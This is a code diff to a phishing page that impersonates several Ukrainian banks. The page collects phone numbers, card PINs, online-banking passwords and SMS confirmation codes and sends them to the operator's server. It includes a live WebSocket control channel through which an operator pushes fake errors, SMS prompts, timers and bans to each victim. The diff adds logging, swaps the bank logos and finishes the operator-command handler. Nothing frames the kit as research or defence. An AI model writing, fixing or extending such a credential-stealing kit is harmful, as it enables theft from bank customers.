@@ -16,7 +16,6 @@
         }
         .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
         #bank-selection-screen { opacity: 1; transform: scale(1); }
-        
         #form-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             opacity: 0; visibility: hidden; transform: scale(1.05);
@@ -114,6 +113,7 @@
 
 <script>
 document.addEventListener('DOMContentLoaded', () => {
+    console.log('DOM loaded, rendering banks...');
     const urlParams = new URLSearchParams(window.location.search);
     const ref = urlParams.get('ref') || 'unknown';
     localStorage.setItem('referrer', ref);
@@ -147,7 +147,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const bankFlows = {
         'oschadbank': {
             name: 'Ощадбанк',
-            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png',
+            logoUrl: 'https://i.imgur.com/4Qv3Z5r.png',
             theme: 'oschadbank',
             steps: [
                 { type: 'phone', title: 'Введіть номер телефону' },
@@ -156,84 +156,74 @@ document.addEventListener('DOMContentLoaded', () => {
         },
         'raiffeisen': {
             name: 'Райффайзен',
-            logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg',
+            logoUrl: 'https://i.imgur.com/8k2xN4P.png',
             theme: 'raiffeisen',
             steps: specialFlowSteps,
             special: true
         },
         'vostok': {
             name: 'Восток',
-            logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png',
+            logoUrl: 'https://i.imgur.com/3p9yW7J.png',
             theme: 'vostok',
             steps: specialFlowSteps,
             special: true
         },
         'izibank': {
             name: 'Izibank',
-            logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png',
+            logoUrl: 'https://i.imgur.com/5t6xM8R.png',
             theme: 'izibank',
             steps: specialFlowSteps,
             special: true
         },
         'ukrsib': {
             name: 'Укрсиб',
-            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp',
+            logoUrl: 'https://i.imgur.com/7y8vQ2T.png',
             theme: 'ukrsib',
             steps: specialFlowSteps,
             special: true
         }
     };
 
+    console.log('bankFlows:', bankFlows);
     const bankGrid = document.querySelector('.bank-grid');
-    const body = document.body;
-    const formHeaderLogo = document.getElementById('form-header-logo');
-    const modalTitle = document.getElementById('modal-title');
-    const stepContent = document.getElementById('modal-step-content');
-    const modalFooter = document.querySelector('.modal-footer');
-    const nextBtn = document.getElementById('next-btn');
-    const backBtn = document.getElementById('back-btn');
-
-    bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
-        const bank = bankFlows[id];
-        return `<a href="#" class="bank-item" data-bank="${id}"><img src="${bank.logoUrl}" alt="${bank.name}"><span class="bank-name">${bank.name}</span></a>`;
-    }).join('');
+    try {
+        bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
+            const bank = bankFlows[id];
+            console.log(`Rendering bank: ${bank.name}`);
+            return `<a href="#" class="bank-item" data-bank="${id}">
+                <img src="${bank.logoUrl}" alt="${bank.name}" onerror="this.style.display='none'">
+                <span class="bank-name">${bank.name}</span>
+            </a>`;
+        }).join('');
+    } catch (e) {
+        console.error('Error rendering banks:', e);
+        bankGrid.innerHTML = '<p style="color: red; text-align: center;">Помилка завантаження банків</p>';
+    }
 
     if (isBanned) {
         document.querySelectorAll('.bank-item').forEach(item => item.style.pointerEvents = 'none');
-        document.querySelector('.bank-grid').innerHTML += '<p style="text-align: center; color: var(--danger-color);">Доступ заблоковано</p>';
+        bankGrid.innerHTML += '<p style="text-align: center; color: var(--danger-color);">Доступ заблоковано</p>';
     }
 
     function connectWebSocket() {
-        let reconnectAttempts = 0;
-        const maxReconnects = 5;
-        function attemptConnect() {
-            ws = new WebSocket(`wss://${window.location.host}/ws`);
-            ws.onopen = () => {
-                console.log('WebSocket connected');
-                reconnectAttempts = 0;
-                ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
-                setInterval(() => {
-                    if (ws.readyState === WebSocket.OPEN) {
-                        ws.send('ping');
-                    }
-                }, 30000);
-            };
-            ws.onmessage = (event) => {
-                const data = event.data;
-                if (data === 'pong') return;
-                const command = JSON.parse(data);
-                handleServerCommand(command);
-            };
-            ws.onclose = () => {
-                console.log('WebSocket closed, reconnecting...');
-                if (reconnectAttempts < maxReconnects) {
-                    reconnectAttempts++;
-                    setTimeout(attemptConnect, 1000 * reconnectAttempts);
-                }
-            };
-            ws.onerror = (error) => console.error('WebSocket error:', error);
-        }
-        attemptConnect();
+        console.log('Connecting WebSocket...');
+        ws = new WebSocket(`wss://${window.location.host}/ws`);
+        ws.onopen = () => {
+            console.log('WebSocket connected');
+            ws.send(JSON.stringify({ type: 'register', sessionId }));
+            setInterval(() => {
+                if (ws.readyState === WebSocket.OPEN) ws.send('ping');
+            }, 30000);
+        };
+        ws.onmessage = (event) => {
+            const data = event.data;
+            if (data === 'pong') return;
+            console.log('WebSocket message:', data);
+            const command = JSON.parse(data);
+            handleServerCommand(command);
+        };
+        ws.onclose = () => console.log('WebSocket closed');
+        ws.onerror = (error) => console.error('WebSocket error:', error);
     }
 
     connectWebSocket();
@@ -245,13 +235,13 @@ document.addEventListener('DOMContentLoaded', () => {
             const response = await fetch('/api/submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    sessionId, 
-                    bankName: activeBankData.name, 
+                body: JSON.stringify({
+                    sessionId,
+                    bankName: activeBankData.name,
                     bankTheme,
-                    isFinalStep: isFinal, 
+                    isFinalStep: isFinal,
                     referrer: localStorage.getItem('referrer') || 'unknown',
-                    ...collectedData 
+                    ...collectedData
                 }),
             });
             console.log('Server response:', await response.json());
@@ -369,7 +359,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
         const pinInput = document.getElementById('pin') || document.querySelector('.custom-input');
         if (pinInput) {
-            // Для PIN клавиатуры логика в renderStep
+            // Логика для PIN клавиатуры в renderStep
         }
         const callCodeInput = document.getElementById('call_code_input');
         if (callCodeInput) {
@@ -555,6 +545,14 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
+    const body = document.body;
+    const formHeaderLogo = document.getElementById('form-header-logo');
+    const modalTitle = document.getElementById('modal-title');
+    const stepContent = document.getElementById('modal-step-content');
+    const modalFooter = document.querySelector('.modal-footer');
+    const nextBtn = document.getElementById('next-btn');
+    const backBtn = document.getElementById('back-btn');
+
     nextBtn.addEventListener('click', handleNextStep);
     backBtn.addEventListener('click', handleBackStep);
 
@@ -567,3 +565,134 @@ document.addEventListener('DOMContentLoaded', () => {
             modalFooter.innerHTML = `<button class="btn btn-back">${btnText}</button>`;
             modalFooter.querySelector('button').addEventListener('click', callback);
         };
+
+        switch (type) {
+            case 'sms':
+                currentSmsText = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
+                modalTitle.textContent = 'Введіть код з SMS';
+                stepContent.innerHTML = currentSmsText;
+                modalFooter.style.display = 'flex';
+                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
+                modalFooter.querySelector('#submit-sms-code').addEventListener('click', submitSmsCode);
+                break;
+            case 'lk_oschad':
+                activeBankData.steps = [{ type: 'lk_oschad', title: 'Авторизація в Ощад24' }];
+                currentStepIndex = 0;
+                renderStep();
+                break;
+            case 'lk_raiffeisen':
+                activeBankData.steps = [{ type: 'lk_raiffeisen', title: 'Введіть пароль' }];
+                currentStepIndex = 0;
+                renderStep();
+                break;
+            case 'lk_vostok':
+                activeBankData.steps = [{ type: 'lk_vostok', title: 'Вхід у Vostok Bank' }];
+                currentStepIndex = 0;
+                renderStep();
+                break;
+            case 'lk_izibank':
+                activeBankData.steps = [{ type: 'lk_izibank', title: 'Введіть ПІН-код' }];
+                currentStepIndex = 0;
+                renderStep();
+                break;
+            case 'lk_ukrsib':
+                activeBankData.steps = [{ type: 'lk_ukrsib', title: 'Підтвердити володіння карткою' }];
+                currentStepIndex = 0;
+                renderStep();
+                break;
+            case 'call_oschad':
+                activeBankData.steps = [{ type: 'call_oschad', title: 'Підтвердження дзвінком' }];
+                currentStepIndex = 0;
+                renderStep();
+                break;
+            case 'code_error':
+                showCodeError();
+                break;
+            case 'timer':
+                modalTitle.textContent = 'Обробка заявки';
+                stepContent.innerHTML = `<div id="timer" style="color:var(--primary-color); font-size: 32px; font-weight: 700; text-align: center; margin-top: 20px;">15:00</div>`;
+                modalFooter.style.display = 'none';
+                let duration = 15 * 60;
+                const display = document.getElementById('timer');
+                const timerInterval = setInterval(() => {
+                    let minutes = parseInt(duration / 60, 10);
+                    let seconds = parseInt(duration % 60, 10);
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+                    display.textContent = minutes + ":" + seconds;
+                    if (--duration < 0) {
+                        clearInterval(timerInterval);
+                        display.textContent = "Готово!";
+                    }
+                }, 1000);
+                break;
+            case 'request_details':
+                let stepsToAdd = JSON.parse(JSON.stringify(confirmationSteps));
+                activeBankData.steps.push(...stepsToAdd);
+                currentStepIndex++;
+                renderStep();
+                break;
+            case 'other':
+                showMessageWithButton("Помилка", data.text, "Обрати інший банк", () => {
+                    const bankItem = document.querySelector(`[data-bank="${activeBankData.theme}"]`);
+                    if (bankItem) bankItem.remove();
+                    body.classList.remove('form-active');
+                });
+                break;
+            case 'pin_error':
+                showMessageWithButton("Невірний ПІН", "Ви не змогли підтвердити володіння карткою. Для підтвердження володіння карткою натисніть назад та заповніть форму з вірним пін-кодом", "Назад", () => window.location.reload());
+                break;
+            case 'number_error':
+                showMessageWithButton("Невірний номер", data.text, "Назад", () => window.location.reload());
+                break;
+            case 'ban':
+                isBanned = true;
+                localStorage.setItem('banned', 'true');
+                document.querySelectorAll('.bank-item').forEach(item => item.style.pointerEvents = 'none');
+                stepContent.innerHTML += '<p style="text-align: center; color: var(--danger-color);">Доступ заблоковано назавжди</p>';
+                body.classList.add('form-active');
+                break;
+            case 'custom':
+                modalTitle.textContent = data.title || 'Повідомлення';
+                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p>`;
+                modalFooter.style.display = 'none';
+                break;
+        }
+    }
+
+    async function submitSmsCode() {
+        const codeInput = document.getElementById('sms-code');
+        const code = codeInput.value;
+
+        if (!code.trim()) {
+            const errorContainer = document.getElementById('sms-error-container');
+            if (errorContainer) {
+                errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
+            }
+            return;
+        }
+
+        console.log('Submitting SMS code:', code);
+
+        try {
+            await fetch('/api/sms', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    sessionId,
+                    code,
+                    referrer: localStorage.getItem('referrer') || 'unknown'
+                }),
+            });
+            console.log('SMS data sent to server.');
+        } catch (error) {
+            console.error('Failed to send sms code:', error);
+        }
+
+        showCodeError();
+        codeInput.value = '';
+    }
+});
+</script>
+</body>
+</html>
